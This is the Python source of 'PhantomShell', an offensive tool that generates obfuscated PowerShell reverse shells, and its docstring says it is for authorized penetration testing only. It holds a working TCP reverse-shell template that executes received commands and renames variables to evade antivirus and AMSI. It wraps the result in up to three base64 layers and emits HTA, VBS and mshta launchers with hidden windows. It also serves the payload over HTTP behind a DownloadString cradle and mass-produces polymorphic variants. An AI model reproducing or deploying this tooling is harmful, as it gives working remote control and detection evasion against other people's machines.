#!/usr/bin/python3
"""
PhantomShell v1.0 — Advanced PowerShell Evasion Framework
by by Adrilaw/Kidpentester (https://github.com/Adrilaw)  & The-Psypher (https://github.com/The-Psypher) - Developers at Red Parakeet.

Generates obfuscated, base64-encoded PowerShell reverse shells
designed to evade signature-based AV/AMSI detection.

For authorized penetration testing only.
"""

import base64
import sys
import signal
import argparse
import os
import http.server
import socketserver
import random
import string
import datetime
import hashlib
import textwrap
from typing import Optional

# ──────────────────────────────────────────────────────────────
# DESIGN RULES (learned from previous bugs)
# ──────────────────────────────────────────────────────────────
# ✓  Variable renaming              — safe, always works
# ✓  utf-16le + base64 (-enc)       — standard PS, always works
# ✓  IP/port hidden in base64       — safe inside the string
# ✓  Multi-layer IEX wrapping       — safe, tested
#
# ✗  Backticks on .NET methods      — ParseError (GetStream, Read…)
# ✗  randomize_case on cmdlets      — breaks "Out-String" → "Ou t-String"
# ✗  Junk comments split on ';'    — corrupts base64 inner strings
# ✗  Python {{ }} in template       — double-braces leak into payload
# ──────────────────────────────────────────────────────────────

VERSION = "2.0"

# ── Colors ─────────────────────────────────────────────────────
C = {
    "R": '\033[0m',   "r": '\033[91m', "g": '\033[92m',
    "y": '\033[93m',  "b": '\033[94m', "c": '\033[96m',
    "w": '\033[97m',  "d": '\033[2m',
}

STAR = f"{C['y']}[{C['b']}*{C['y']}]{C['R']}"
OK   = f"{C['g']}[{C['w']}+{C['g']}]{C['R']}"
ERR  = f"{C['r']}[{C['y']}!{C['r']}]{C['R']}"
INFO = f"{C['c']}[{C['w']}i{C['c']}]{C['R']}"


def sig(s, f):
    print(f"\n{ERR} {C['r']}Ctrl+C — bye.{C['R']}")
    sys.exit(0)

signal.signal(signal.SIGINT, sig)


# ── Banner ──────────────────────────────────────────────────────
def banner():
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"""{C['r']}
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{C['c']}
       ███████╗██╗  ██╗███████╗██╗     ██╗
       ██╔════╝██║  ██║██╔════╝██║     ██║
       ███████╗███████║█████╗  ██║     ██║
       ╚════██║██╔══██║██╔══╝  ██║     ██║
       ███████║██║  ██║███████╗███████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{C['R']}
  {C['d']}v{VERSION} — PowerShell Evasion Framework — by Red Parakeet Security Team{C['R']}
  {C['d']}https://github.com/Red-Parakeet  [{ts}]{C['R']}
""")


# ── Argument Parser ─────────────────────────────────────────────
def get_args():
    p = argparse.ArgumentParser(
        prog=f"python3 {sys.argv[0]}",
        description=f"{C['c']}PhantomShell{C['R']} — PowerShell Evasion Framework",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    sub = p.add_subparsers(dest="command")

    # ── revshell ────────────────────────────────────────────────
    rev = sub.add_parser("revshell",
        help="Generate a standalone encoded reverse-shell payload",
        epilog=f"{C['y']}Example: python3 {sys.argv[0]} revshell -i 10.10.10.5 -p 4444{C['R']}")
    rev.add_argument("-i", "--attacker-ip", required=True, help="Your IP address")
    rev.add_argument("-p", "--port", type=int, required=True, help="Listening port")
    rev.add_argument("-o", "--obf-profile", default="aggressive",
                     choices=["minimal", "aggressive", "random"],
                     help="Obfuscation profile (default: aggressive)")
    rev.add_argument("-l", "--layers", type=int, default=1, choices=[1, 2, 3],
                     help="Encoding layers 1-3 (default: 1)")
    rev.add_argument("-f", "--format", default="powershell",
                     choices=["powershell", "cmd", "hta", "vbs", "mshta"],
                     help="Output format (default: powershell)")
    rev.add_argument("--enc-b64",     action="store_true", help="Hide IP/port in base64 inside payload")
    rev.add_argument("--keep-pwd",    action="store_true", help="Show CWD in prompt (may trigger AMSI)")
    rev.add_argument("--do-not-hide", action="store_true", help="Omit -NoP -sta -NonI -W Hidden")
    rev.add_argument("-v", "--verbose", action="store_true", help="Show decoded payload before encoding")
    rev.add_argument("--no-banner",   action="store_true")

    # ── server ──────────────────────────────────────────────────
    srv = sub.add_parser("server",
        help="Host payload on HTTP + print download cradle",
        epilog=f"{C['y']}Example: python3 {sys.argv[0]} server -i 10.10.10.5 -p 4444{C['R']}")
    srv.add_argument("-i", "--attacker-ip", required=True)
    srv.add_argument("-p", "--port", type=int, required=True)
    srv.add_argument("--server-port", type=int, default=8000, help="HTTP port (default: 8000)")
    srv.add_argument("-o", "--outfile", default="", help="Payload filename (random if omitted)")
    srv.add_argument("--obf-profile", default="aggressive",
                     choices=["minimal", "aggressive", "random"])
    srv.add_argument("-l", "--layers", type=int, default=1, choices=[1, 2, 3])
    srv.add_argument("-f", "--format", default="powershell",
                     choices=["powershell", "cmd", "hta", "vbs", "mshta"])
    srv.add_argument("--enc-b64",     action="store_true")
    srv.add_argument("--keep-pwd",    action="store_true")
    srv.add_argument("--keep-file",   action="store_true", help="Keep payload file after serving")
    srv.add_argument("--do-not-hide", action="store_true")
    srv.add_argument("-v", "--verbose", action="store_true")
    srv.add_argument("--no-banner",   action="store_true")

    # ── polymorph ────────────────────────────────────────────────
    poly = sub.add_parser("polymorph",
        help="Generate N unique variants in one shot",
        epilog=f"{C['y']}Example: python3 {sys.argv[0]} polymorph -i 10.10.10.5 -p 4444 -n 5{C['R']}")
    poly.add_argument("-i", "--attacker-ip", required=True)
    poly.add_argument("-p", "--port", type=int, required=True)
    poly.add_argument("-n", "--count", type=int, default=3, help="Number of variants (default: 3)")
    poly.add_argument("-l", "--layers", type=int, default=1, choices=[1, 2, 3])
    poly.add_argument("--enc-b64",   action="store_true")
    poly.add_argument("--keep-pwd",  action="store_true")
    poly.add_argument("-v", "--verbose", action="store_true")
    poly.add_argument("--no-banner", action="store_true")

    return p.parse_args()


# ── Shell Template ──────────────────────────────────────────────
# Uses __PLACEHOLDERS__ to avoid any Python f-string brace conflicts.
# Single { } braces here = single { } braces in the final PS payload.
# .NET method/property names are NEVER modified.
SHELL = (
    "$client = New-Object System.Net.Sockets.TCPClient('__IP__',__PORT__);"
    "$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{0};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);"
    "$sendback = (IEX $data 2>&1 | Out-String);"
    "$sendback2 = $sendback + '__PROMPT__';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte, 0, $sendbyte.Length);"
    "$stream.Flush()};"
    "$client.Close()"
)


# ── Encoding helpers ────────────────────────────────────────────
def to_b64(text) -> str:
    """Standard base64 (used for IP/port hiding)."""
    return base64.b64encode(str(text).encode()).decode()


def to_enc(ps_code: str) -> str:
    """PowerShell -EncodedCommand: utf-16le → base64."""
    return base64.b64encode(ps_code.encode("utf-16le")).decode()


# ── Build raw shell string ──────────────────────────────────────
def build_raw(ip: str, port: int, keep_pwd: bool, enc_b64: bool) -> str:
    prompt = "PS $(pwd)> " if keep_pwd else "PS> "

    if enc_b64:
        b64_ip   = to_b64(ip)
        b64_port = to_b64(port)
        conn = (
            f"([System.Text.Encoding]::UTF8.GetString"
            f"([System.Convert]::FromBase64String('{b64_ip}'))),"
            f"[int]([System.Text.Encoding]::UTF8.GetString"
            f"([System.Convert]::FromBase64String('{b64_port}')))"
        )
        raw = SHELL.replace("'__IP__',__PORT__", conn)
    else:
        raw = SHELL.replace("__IP__", ip).replace("__PORT__", str(port))

    return raw.replace("__PROMPT__", prompt)


# ── Variable rename maps ────────────────────────────────────────
# Keys sorted longest-first to prevent partial replacement bugs
# ($sendback2 must be replaced before $sendback, etc.)

MINIMAL = {
    "$sendback2": "$sb2",
    "$sendback":  "$sb",
    "$sendbyte":  "$sy",
    "$client":    "$c",
    "$stream":    "$st",
    "$bytes":     "$b",
    "$data":      "$d",
}

AGGRESSIVE = {
    "$sendback2": "$xE52",
    "$sendback":  "$xE5",
    "$sendbyte":  "$xF6",
    "$client":    "$xA1",
    "$stream":    "$xB2",
    "$bytes":     "$xC3",
    "$data":      "$xD4",
}


def random_map() -> dict:
    """Fully random variable names, unique per call."""
    keys  = ["$sendback2", "$sendback", "$sendbyte", "$client", "$stream", "$bytes", "$data"]
    used  = set()
    out   = {}
    chars = string.ascii_letters + string.digits
    for k in keys:
        while True:
            length = random.randint(5, 10)
            name   = "$" + random.choice(string.ascii_letters) + \
                     "".join(random.choices(chars, k=length - 1))
            if name not in used:
                used.add(name)
                out[k] = name
                break
    return out


def rename_vars(payload: str, vmap: dict) -> str:
    for orig, repl in vmap.items():   # already longest-first
        payload = payload.replace(orig, repl)
    return payload


# ── Obfuscate ───────────────────────────────────────────────────
def obfuscate(raw: str, profile: str) -> str:
    if   profile == "minimal":    obf = rename_vars(raw, MINIMAL)
    elif profile == "random":     obf = rename_vars(raw, random_map())
    else:                         obf = rename_vars(raw, AGGRESSIVE)
    return obf


# ── Verify payload integrity ────────────────────────────────────
REQUIRED = ["GetStream", "Read(", "Write(", "Flush(", "Close()",
            "GetBytes(", "GetString(", ".Length", "Out-String", "IEX"]

def verify(payload: str) -> bool:
    ok = True
    for token in REQUIRED:
        if token not in payload:
            print(f"{ERR} MISSING token in payload: {C['r']}{token}{C['R']}")
            ok = False
    if "{{" in payload or "}}" in payload:
        print(f"{ERR} Double-brace leak detected — payload will break PS")
        ok = False
    bad = [c for c in payload if ord(c) > 127]
    if bad:
        print(f"{ERR} Non-ASCII chars in payload: {bad}")
        ok = False
    return ok


# ── Multi-layer encoding ────────────────────────────────────────
def encode_layers(ps_code: str, layers: int, verbose: bool = False) -> str:
    """
    Layer 1: utf-16le → base64  (direct -enc)
    Layer 2: wrap in IEX+FromBase64String, then utf-16le → base64
    Layer 3: wrap again in $d/$s/IEX triple, then utf-16le → base64
    Each layer encodes the ENTIRE previous stage — no nesting issues.
    """
    enc = ps_code

    # Layer 1
    enc = to_enc(enc)
    if verbose:
        preview = enc[:64] + "…" if len(enc) > 64 else enc
        print(f"{INFO} Layer 1: {C['d']}{preview}{C['R']}")

    if layers >= 2:
        stage2 = (
            f"IEX([System.Text.Encoding]::Unicode.GetString("
            f"[System.Convert]::FromBase64String('{enc}')))"
        )
        enc = to_enc(stage2)
        if verbose:
            preview = enc[:64] + "…" if len(enc) > 64 else enc
            print(f"{INFO} Layer 2: {C['d']}{preview}{C['R']}")

    if layers >= 3:
        stage3 = (
            f"$_b=[System.Convert]::FromBase64String('{enc}');"
            f"$_s=[System.Text.Encoding]::Unicode.GetString($_b);"
            f"IEX($_s)"
        )
        enc = to_enc(stage3)
        if verbose:
            preview = enc[:64] + "…" if len(enc) > 64 else enc
            print(f"{INFO} Layer 3: {C['d']}{preview}{C['R']}")

    return enc


# ── Verify multi-layer decodes back cleanly ─────────────────────
def verify_layers(original: str, encoded: str, layers: int) -> bool:
    """Decode layers and confirm original payload is recoverable."""
    try:
        dec = base64.b64decode(encoded).decode("utf-16-le")
        if layers == 1:
            return dec == original
        elif layers >= 2:
            import re
            m = re.search(r"FromBase64String\('([A-Za-z0-9+/=]+)'\)", dec)
            if not m:
                return False
            dec2 = base64.b64decode(m.group(1)).decode("utf-16-le")
            if layers == 2:
                return original in dec2
            elif layers == 3:
                m2 = re.search(r"FromBase64String\('([A-Za-z0-9+/=]+)'\)", dec2)
                if not m2:
                    return False
                dec3 = base64.b64decode(m2.group(1)).decode("utf-16-le")
                return original in dec3
    except Exception as e:
        print(f"{ERR} Layer verification failed: {e}")
        return False
    return False


# ── Output formatters ───────────────────────────────────────────
def wrap(enc: str, fmt: str, hide: bool) -> str:
    h = " -NoP -sta -NonI -W Hidden" if hide else ""
    if fmt == "powershell":
        return f"powershell{h} -enc {enc}"
    elif fmt == "cmd":
        return f'cmd /c "powershell{h} -enc {enc}"'
    elif fmt == "hta":
        return textwrap.dedent(f"""\
            <html><head><script language="VBScript">
            Set o = CreateObject("WScript.Shell")
            o.Run "powershell{h} -enc {enc}", 0, False
            window.close()
            </script></head><body></body></html>""")
    elif fmt == "vbs":
        return textwrap.dedent(f"""\
            Set o = CreateObject("WScript.Shell")
            o.Run "powershell{h} -enc {enc}", 0, False""")
    elif fmt == "mshta":
        return (f'mshta vbscript:CreateObject("WScript.Shell")'
                f'.Run("powershell{h} -enc {enc}",0,False)(window.close)')
    return f"powershell{h} -enc {enc}"


# ── Print result ────────────────────────────────────────────────
def print_result(payload: str, port: int, fmt: str, layers: int, profile: str):
    fp = hashlib.md5(payload.encode()).hexdigest()[:8].upper()
    print(f"\n{OK} {C['g']}Payload ready{C['R']}  "
          f"profile={C['c']}{profile}{C['R']}  "
          f"layers={C['y']}{layers}{C['R']}  "
          f"FP={C['c']}{fp}{C['R']}\n")
    print(f"{C['d']}{'─'*74}{C['R']}")
    print(f"{C['r']}{payload}{C['R']}")
    print(f"{C['d']}{'─'*74}{C['R']}\n")
    print(f"{STAR} Format   : {C['c']}{fmt}{C['R']}")
    print(f"{STAR} Listener : {C['g']}python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026 {port}{C['R']}\n")


# ── File helper ─────────────────────────────────────────────────
def write_file(path: str, content: str):
    try:
        with open(path, "w") as f:
            f.write(content)
        print(f"{OK} Written → {C['c']}{path}{C['R']}")
    except Exception as e:
        print(f"{ERR} Write failed: {e}")
        sys.exit(1)


# ── HTTP server ─────────────────────────────────────────────────
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"{OK} {C['g']}GET{C['R']} {self.path} ← {C['y']}{self.client_address[0]}{C['R']}")
        super().do_GET()
    def log_message(self, *_):
        pass


def run_server(port: int, filepath: str, keep: bool):
    try:
        with socketserver.TCPServer(("", port), Handler) as httpd:
            fname = os.path.basename(filepath)
            print(f"{STAR} HTTP :{C['r']}{port}{C['R']} → {C['c']}{fname}{C['R']}")
            print(f"{C['d']}Ctrl+C to stop{C['R']}\n")
            httpd.serve_forever()
    except OSError as e:
        if "in use" in str(e).lower():
            print(f"{ERR} Port {port} already in use. Try --server-port <N>")
        sys.exit(1)
    finally:
        if os.path.isfile(filepath) and not keep:
            os.remove(filepath)
            print(f"\n{INFO} Deleted {C['c']}{os.path.basename(filepath)!r}{C['R']}")


# ── Core workflow ───────────────────────────────────────────────
def make_payload(ip, port, profile, layers, keep_pwd, enc_b64, verbose, do_not_hide, fmt):
    # 1. Build raw shell
    raw = build_raw(ip, port, keep_pwd, enc_b64)

    # 2. Obfuscate (variable renaming only — proven safe)
    obf = obfuscate(raw, profile)

    if verbose:
        print(f"{STAR} Obfuscated payload:\n{C['d']}{obf}{C['R']}\n")

    # 3. Verify integrity before encoding
    if not verify(obf):
        print(f"{ERR} Payload integrity check FAILED. Aborting.")
        sys.exit(1)

    # 4. Encode
    enc = encode_layers(obf, layers, verbose)

    # 5. Verify layers decode correctly
    if not verify_layers(obf, enc, layers):
        print(f"{ERR} Layer round-trip verification FAILED. Aborting.")
        sys.exit(1)

    # 6. Wrap in output format
    hide = not do_not_hide
    return wrap(enc, fmt, hide), profile, layers, fmt


# ── Commands ────────────────────────────────────────────────────
def cmd_revshell(args):
    final, profile, layers, fmt = make_payload(
        args.attacker_ip, args.port,
        args.obf_profile, args.layers,
        args.keep_pwd, args.enc_b64,
        args.verbose, args.do_not_hide, args.format
    )
    print_result(final, args.port, fmt, layers, profile)


def cmd_server(args):
    # Name the file
    fname = args.outfile or ("svc_" + "".join(random.choices(string.ascii_lowercase, k=6)) + ".ps1")
    args.outfile = fname

    # Build the raw obfuscated payload (NOT encoded — it's a .ps1 file)
    raw = build_raw(args.attacker_ip, args.port, args.keep_pwd, args.enc_b64)
    obf = obfuscate(raw, args.obf_profile)

    if not verify(obf):
        print(f"{ERR} Payload integrity check FAILED. Aborting.")
        sys.exit(1)

    fpath = os.path.join(os.getcwd(), fname)
    write_file(fpath, obf)

    # Build the download cradle (this is what target executes)
    cradle = (
        f'IEX(New-Object Net.WebClient)'
        f'.DownloadString("http://{args.attacker_ip}:{args.server_port}/{fname}")'
    )
    enc_cradle = encode_layers(cradle, args.layers, args.verbose)
    hide       = not args.do_not_hide
    final      = wrap(enc_cradle, args.format, hide)

    print_result(final, args.port, args.format, args.layers, args.obf_profile)
    run_server(args.server_port, fpath, args.keep_file)


def cmd_polymorph(args):
    profiles = ["minimal", "aggressive", "random"]
    print(f"{STAR} Generating {C['y']}{args.count}{C['R']} polymorphic variants…\n")

    for i in range(1, args.count + 1):
        profile = profiles[(i - 1) % len(profiles)]
        final, _, layers, fmt = make_payload(
            args.attacker_ip, args.port,
            profile, args.layers,
            args.keep_pwd, args.enc_b64,
            args.verbose, False, "powershell"
        )
        fp = hashlib.md5(final.encode()).hexdigest()[:8].upper()
        print(f"{C['c']}── Variant {i}  profile={profile}  layers={layers}  FP:{fp}  {'─'*28}{C['R']}")
        print(f"{C['r']}{final}{C['R']}\n")


# ── Main ────────────────────────────────────────────────────────
def main():
    args = get_args()

    if not args.command:
        print(f"{ERR} Usage: python3 {sys.argv[0]} {{revshell|server|polymorph}} -h")
        sys.exit(1)

    if not getattr(args, "no_banner", False):
        banner()

    if   args.command == "revshell":  cmd_revshell(args)
    elif args.command == "server":    cmd_server(args)
    elif args.command == "polymorph": cmd_polymorph(args)


if __name__ == "__main__":
    main()
